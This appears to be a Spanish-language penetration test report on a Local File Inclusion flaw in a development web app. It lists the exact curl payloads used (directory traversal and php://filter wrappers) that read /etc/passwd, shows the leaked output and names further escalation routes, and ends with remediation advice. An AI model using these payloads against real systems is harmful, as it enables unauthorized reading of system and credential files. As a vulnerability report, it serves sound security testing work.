# Informe LFI - 2026-04-27T15:43:00Z

Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Se realizó análisis de Local File Inclusion (LFI) sobre la aplicación web objetivo.

Descubrimiento:
- Punto de entrada dinámico identificado: gallery.php?page y parámetro id en la página principal (formulario "id").

Comandos y payloads usados (comandos exactos ejecutados):
- curl -s -i "http://web.dev.local:8081/gallery.php?page=../../../../etc/passwd"
- curl -s -i "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd"
- curl -s -i "http://web.dev.local:8081/?id=../../../../etc/passwd"
- curl -s -i "http://web.dev.local:8081/?id=php://filter/read=convert.base64-encode/resource=/etc/passwd"

Hallazgos:
- La petición a gallery.php?page=../../../../etc/passwd devolvió el contenido de /etc/passwd en el cuerpo HTML:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

- La técnica php://filter también devolvió contenido codificado en base64 dentro de la respuesta, confirmando la capacidad de incluir y leer ficheros del sistema.

Explotación realizada:
- Lectura de ficheros críticos del sistema: se confirmó lectura de /etc/passwd a través de gallery.php?page con traversal.
- A partir de la lectura de /etc/passwd, se identificó que el usuario del servicio web es probablemente www-data.

Impacto:
- Confidencialidad: exposición de cuentas del sistema (/etc/passwd). Riesgo medio-alto si existen ficheros de configuración o credenciales accesibles.
- Integridad/Disponibilidad: el LFI podría permitir RCE mediante técnicas adicionales (log poisoning, wrappers, inclusión de /proc/self/environ), no probadas exhaustivamente en esta iteración.

Recomendaciones:
1. Validar y normalizar los parámetros de entrada (whitelisting de páginas permitidas).
2. Evitar inclusión directa de ficheros con parámetros controlados por el usuario; usar mapeos internos o rutas seguras.
3. Deshabilitar wrappers no necesarios y restringir permisos de archivos sensibles.
4. Registrar y monitorizar accesos con alertas para patrones de traversal y uso de php:// wrappers.

Evidencias y archivos generados:
- /app/reports/lfi_runs/g1.txt (respuesta para gallery.php?page=../../../../etc/passwd)
- /app/reports/lfi_runs/g2.txt (respuesta para php://filter payload)

Fin del informe.
